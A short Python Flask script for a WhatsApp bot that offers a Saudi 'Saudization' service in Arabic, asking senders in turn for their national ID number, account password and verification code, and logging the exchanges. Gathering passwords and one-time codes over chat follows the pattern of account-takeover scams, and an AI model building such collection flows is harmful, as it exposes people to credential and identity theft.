import os
import requests
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

USER_PHONE_NUMBER = os.getenv("USER_PHONE_NUMBER", "+967780952606")
TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER", "+14155238886")

log_file = "requests_log.txt"

@app.route("/whatsapp", methods=["POST"])
def whatsapp_bot():
    incoming_msg = request.form.get("Body", "").strip().lower()
    sender = request.form.get("From", "")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    reply = ""

    if "سعودة" in incoming_msg:
        reply = "📝 أرسل رقم الهوية:"
        log_request("طلب سعودة", sender, now)
    elif incoming_msg.isdigit() and len(incoming_msg) == 10:
        reply = "🔑 أرسل كلمة المرور:"
        log_request(f"الهوية: {incoming_msg}", sender, now)
    elif "pass" in incoming_msg or "كلمه" in incoming_msg:
        reply = "⏳ جاري تسجيل الدخول للموقع..."
        log_request(f"كلمة مرور مستلمة", sender, now)
    elif "كود" in incoming_msg:
        reply = "✅ تم استلام كود التحقق. جاري إكمال السعودة..."
        log_request("كود تحقق", sender, now)
    else:
        reply = "👋 مرحباً! أرسل 'سعودة' للبدء."

    send_whatsapp_reply(sender, reply)
    return "OK", 200

def log_request(content, sender, timestamp):
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {sender}: {content}\n")

def send_whatsapp_reply(to, body):
    print(f"Reply to {to}: {body}")  # محاكاة إرسال الرسالة

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)